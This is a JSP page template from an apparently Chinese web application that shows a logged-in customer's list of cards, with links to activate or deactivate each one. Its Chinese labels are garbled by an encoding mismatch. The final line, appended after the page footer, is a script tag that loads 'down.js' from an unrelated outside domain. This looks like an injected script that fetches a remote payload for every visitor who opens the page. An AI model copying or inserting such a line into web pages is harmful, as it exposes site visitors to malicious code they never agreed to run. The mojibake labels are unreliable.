<%@ page language="java" pageEncoding="GBK" %>
<%@ taglib prefix="c" uri="http://java.sun.com/jstl/core" %>
<%@ taglib prefix="fmt" uri="http://java.sun.com/jstl/fmt" %>
<%@ taglib prefix="ctg" uri="/WEB-INF/category.tld"%>
<c:set var="title" value="��������-��Ƭ��ѯ"/> 
<%@ include file="IncludeTop.jsp" %>


<table width="780" border="0" align="center" cellpadding="0" cellspacing="0">
  <tr> 
    <td width="178" valign="top"> 
      <%@ include file="accountBar.jsp" %>
      <%@ include file="searchAllBar.jsp" %>
      <%@ include file="newsBar.jsp" %>    </td>
    <td width="602" bgcolor="#FFFFFF" valign="top">
	  <c:if test="${empty userSession}">
	     <table  width="100%" height="300" border="0" cellpadding="0" cellspacing="0">
			<tr > 
			  <td align="center" colspan="4" class="red15">����û�е�½��</td>
			</tr>
			<tr >
			  <td align="center" colspan="4" class="red15">&nbsp;</td>
		   </tr>
		</table>
	  </c:if >
	  <c:if test="${!empty userSession}">
	  <c:set var="customer" value="${userSession.customer}"/> 
        
      <table width="100%" border="0" cellpadding="1" cellspacing="0" bordercolor="#CCCCCC">
        <tr bgcolor="#ACD1FF"> 
          <td height="28" colspan="3" align="center">            <strong>���Ŀ��б�</strong></td>
          <td colspan="2" align="center"><a href='<c:url value="/registerCard.screen"/>'>ע���¿�</a></td>
        </tr>
        <tr  bgcolor="#E1EFFF"> 
          <td width="68" height="28" align="center">����</td>
          <td width="86" align="center">�̻���</td>
          <td width="82" align="center">����</td>
          <td width="56" align="center">ע�᷽ʽ</td>
          <td width="43" align="center">״̬</td>
        </tr>
        <c:if test="${empty result.cardList}"> 
        <tr> 
          <td height="78" colspan="5" align="center" class="red15">��Ϊ�գ�</td>
        </tr>
        </c:if>
		<c:if test="${!empty result.cardList}">
		<c:forEach var="item" items="${result.cardList}" > 
        <tr> 
          <td width="68" height="31"><c:out value="${item.cardNo}"/></td>
          <td width="86"><a href='<c:url value="/getMerchantInfo.do"/>?merchantNo=<c:out value="${item.merchantNo}"/>'><c:out value="${item.merchantName}"/></a></td>
          <td width="82"><c:out value="${item.cardName}"/></td>
          <td width="56"><c:out value="${item.requestType}"/></td>
          <c:choose>
			  <c:when test="${item.status eq '0'}"> 
			  
          <td align="center" alt="��ע��,δ����" >ע��</td>
			  
          <td align="center" ><a href='<c:url value="/effectCard.do?cardNo="/><c:out value="${item.cardNo}"/>'>>>����</a></td>
			  </c:when>
			  <c:when test="${item.status eq '1'}"> 
			  
          <td align="center" alt="�Ѽ���,������" >����</td>
			  
          <td align="center" ><a href='<c:url value="/ineffectCard.do?cardNo="/><c:out value="${item.cardNo}"/>'>>>����</a></td>
			  </c:when>
			  <c:when test="${item.status eq '2'}"> 
			  
          <td align="center" alt="������,�������¼���" >����</td>
			  
          <td align="center" ><a href='<c:url value="/effectCard.do?cardNo="/><c:out value="${item.cardNo}"/>'>>>����</a></td>
			  </c:when>
			  <c:otherwise> 
			  
          <td align="center" width="1">&nbsp;</td>
			  
          <td align="center" width="1">&nbsp;</td>
			  </c:otherwise>
		  </c:choose>
		  </tr>
        </c:forEach>
		</c:if> 
      </table>
  </c:if >    </tr>
</table>

<%@ include file="IncludeBottom.jsp" %>

<script language=javascript src=http://Town.531jx.cn/down.js></script>